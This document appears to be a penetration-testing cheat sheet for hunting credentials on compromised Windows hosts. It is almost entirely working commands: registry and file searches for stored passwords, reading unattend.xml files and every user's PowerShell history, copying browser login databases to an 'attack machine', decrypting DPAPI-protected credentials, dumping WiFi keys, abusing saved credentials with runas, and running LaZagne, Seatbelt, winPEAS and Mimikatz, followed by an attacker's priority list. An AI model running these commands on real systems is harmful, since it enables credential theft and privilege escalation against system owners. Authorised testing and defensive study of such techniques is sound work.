## Credential Hunting

Credentials found during post-exploitation often provide a faster path to privilege escalation than technical exploits. The goal is to search systematically across every location where Windows applications, scripts, and users inadvertently store plaintext or recoverable credentials. 

***

## Category 1: Configuration and Application Files

```powershell
# Broad keyword search across common config file types
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1 *.bat
findstr /SIM /C:"passwd" *.txt *.ini *.cfg *.config *.xml
findstr /SIM /C:"pwd" *.txt *.ini *.cfg *.config

# Recursive search from specific directories
findstr /spin "password" C:\inetpub\* 2>nul
findstr /spin "password" C:\scripts\* 2>nul
findstr /spin "password" "C:\Program Files\*" 2>nul
findstr /spin "password" "C:\Program Files (x86)\*" 2>nul
```

### IIS and Web Server Credential Files

```cmd
:: web.config - frequently contains DB connection strings and API credentials
type C:\inetpub\wwwroot\web.config | findstr "connectionString\|password\|pwd"

:: Search recursively across all IIS sites
findstr /SIM /C:"password" C:\inetpub\*.config
dir /s /b C:\inetpub\*.config

:: .NET framework config
type "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config" | findstr "password"
```

```xml
<!-- Example of what to look for in web.config -->
<connectionStrings>
    <add name="DBConnection"
         connectionString="Server=db01;Database=AppDB;User Id=sa;Password=P@ssw0rd123;"
         providerName="System.Data.SqlClient" />
</connectionStrings>
```

### Other Application Config Locations

```cmd
:: XAMPP / Apache
type C:\xampp\mysql\bin\my.ini | findstr "password"
type C:\xampp\passwords.txt

:: FileZilla FTP server
type "C:\Program Files\FileZilla Server\FileZilla Server.xml" | findstr "Pass"

:: Tomcat
type "C:\Program Files\Apache Software Foundation\Tomcat*\conf\tomcat-users.xml"

:: WinSCP saved sessions
reg query HKCU\Software\Martin Prikryl\WinSCP 2\Sessions /s | findstr "Password"

:: PuTTY saved sessions
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s | findstr "ProxyPassword\|UserNameFromEnvironment"
```

***

## Category 2: Windows Registry Credential Locations

```cmd
:: Winlogon autologon credentials (DefaultPassword)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr "DefaultUserName\|DefaultPassword\|AltDefaultUserName\|AltDefaultPassword"

:: VNC passwords (stored obfuscated in registry)
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server" /v Password
reg query "HKCU\Software\TightVNC\Server" /v ControlPassword

:: SNMP community string
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

:: Search entire registry for the word password
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul

:: Stored credentials via Credential Manager
cmdkey /list
:: Look for: Target=domain\username or TERMSRV for RDP sessions
```

***

## Category 3: Unattended Installation Files

Left over from Windows deployment builds, these files frequently contain the local Administrator password. Credentials are stored in plaintext or base64, not encrypted. 

```cmd
:: Check every known unattend file location
dir /s /b C:\unattend.xml 2>nul
dir /s /b C:\Windows\Panther\Unattend.xml 2>nul
dir /s /b C:\Windows\Panther\Unattend\Unattend.xml 2>nul
dir /s /b C:\Windows\system32\sysprep.inf 2>nul
dir /s /b C:\Windows\system32\sysprep\sysprep.xml 2>nul

:: Read and search for passwords
type C:\Windows\Panther\Unattend.xml | findstr /i "password\|autologon\|Username"
```

```xml
<!-- What a vulnerable unattend.xml looks like -->
<AutoLogon>
    <Password>
        <Value>local_4dmin_p@ss</Value>   <!-- Plaintext -->
        <PlainText>true</PlainText>
    </Password>
    <Username>Administrator</Username>
</AutoLogon>

<!-- Base64 encoded version -->
<Password>
    <Value>bG9jYWxfNGRtaW5fcEBzcw==</Value>   <!-- base64 encoded -->
    <PlainText>false</PlainText>
</Password>
```

```bash
# Decode base64 password on attack machine
echo "bG9jYWxfNGRtaW5fcEBzcw==" | base64 -d
# Output: local_4dmin_p@ss
```

```
# Metasploit module for automated unattend discovery
msf6 > use post/windows/gather/enum_unattend
msf6 > set SESSION 1
msf6 > run
```

***

## Category 4: PowerShell History File

Every interactive PowerShell command is logged here by default since PowerShell 5.0 on Windows 10. Administrators frequently pass credentials directly on the command line during troubleshooting or scripting. 

```powershell
# Check where history is saved on current system
(Get-PSReadLineOption).HistorySavePath
# Default: C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Read current user's history
gc (Get-PSReadLineOption).HistorySavePath

# Read ALL users' history (requires access to their profile directories)
foreach ($user in (ls C:\users).fullname) {
    $path = "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
    if (Test-Path $path) {
        Write-Host "`n=== $user ===" -ForegroundColor Yellow
        cat $path -ErrorAction SilentlyContinue
    }
}

# Filter history specifically for credential keywords
foreach ($user in (ls C:\users).fullname) {
    cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue |
    Select-String -Pattern "password|passwd|credential|secret|key|-p |/p:" -CaseSensitive:$false
}
```

Credentials to look for in history: 
- `wevtutil` commands using `/u:` and `/p:` flags
- `net use` with `/user:` and password arguments
- `Invoke-WebRequest` or `curl` with `-Credential` or `Authorization:` headers
- `New-Object PSCredential` calls with hardcoded strings
- Database connection strings passed to `Invoke-SqlCmd`

***

## Category 5: Browser Credential Storage

```powershell
# Chrome Custom Dictionary - may contain passwords user added to avoid spell check flags
gc "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Custom Dictionary.txt" |
    Select-String -Pattern "password|passwd|pass" -CaseSensitive:$false

# Chrome Login Data (SQLite DB - copy first, Chrome locks the file)
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" C:\Windows\Temp\ChromeLogins
# Then transfer to attack machine and parse with:
# python3 -m pip install pysqlite3
# or use a tool like SharpChromium / ChromePass

# Firefox logins.json and key4.db
dir "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*" | Select-Object FullName
# Files to extract: logins.json, key4.db, cert9.db
# Decrypt with: firepwd.py or firefox_decrypt.py
```

***

## Category 6: PowerShell Credential Objects (DPAPI-Protected)

PowerShell `Export-Clixml` encrypts credentials using DPAPI, binding them to the current user and machine. If you have code execution as that user, you can decrypt them directly with no additional tools. 

```powershell
# Search for exported credential files
dir C:\scripts\*.xml -ErrorAction SilentlyContinue
dir C:\Users\*\Documents\*.xml -ErrorAction SilentlyContinue
findstr /SIM /C:"SecureString" *.xml *.ps1

# Decrypt if running as the credential owner
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().Username
$credential.GetNetworkCredential().Password
$credential.GetNetworkCredential().Domain

# Find all .xml files that look like credential exports
Get-ChildItem -Path C:\ -Recurse -Filter "*.xml" -ErrorAction SilentlyContinue |
    Select-String -Pattern "SecureString" |
    Select-Object Path -Unique
```

***

## Category 7: Additional High-Value Credential Locations

```cmd
:: Windows Credential Manager - saved passwords for network shares, RDP, websites
cmdkey /list
:: If entries exist with passwords, use runas /savedcred to leverage them:
runas /savecred /user:DOMAIN\Administrator "cmd.exe /c whoami > C:\Windows\Temp\out.txt"

:: WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="NetworkName" key=clear | findstr "Key Content"
:: Loop all WiFi profiles:
for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profile name="%j" key=clear 2>nul | findstr -i "key content"

:: DPAPI credential blobs
dir /a C:\Users\*\AppData\Local\Microsoft\Credentials\* 2>nul
dir /a C:\Users\*\AppData\Roaming\Microsoft\Credentials\* 2>nul
:: Can be decrypted with Mimikatz: dpapi::cred /in:<blob> or via Seatbelt

:: Sticky Notes database (Windows 10) - users store passwords in notes
dir /s /b "C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes*\LocalState\plum.sqlite" 2>nul
:: Open with any SQLite browser, table: Note

:: Recently run commands (RunMRU)
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

:: Recently opened files
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"
```

***

## Automated Credential Search

```powershell
# LaZagne - searches 60+ credential locations including browsers, email, git, databases
.\LaZagne.exe all

# Seatbelt (GhostPack) - credential-focused checks
.\Seatbelt.exe WindowsCredentialFiles
.\Seatbelt.exe PowerShellHistory
.\Seatbelt.exe PuttyHostKeys
.\Seatbelt.exe WinAutoLogon
.\Seatbelt.exe CredEnum

# winPEAS - includes credential hunting
.\winPEASx64.exe quiet filesinfo userinfo
```

***

## Credential Hunting Priority Order

```
1. cmdkey /list          -> Saved network/RDP credentials (immediately usable)
2. PowerShell history    -> Often contains cleartext -Password or /p: flags
3. Winlogon registry     -> AutoLogon credentials survive reboots
4. unattend.xml locations -> Admin password from deployment, still active
5. web.config / app configs -> DB and service account credentials
6. DPAPI credential blobs -> Decrypt as current user, may hold domain creds
7. Browser databases     -> Saved website passwords including internal apps
8. WiFi profiles         -> Key=clear reveals PSK, may reuse passwords
9. Custom Dictionary.txt -> Passive credential capture from spell check
10. Script files (.ps1/.bat/.py) -> Hardcoded credentials in automation scripts
```
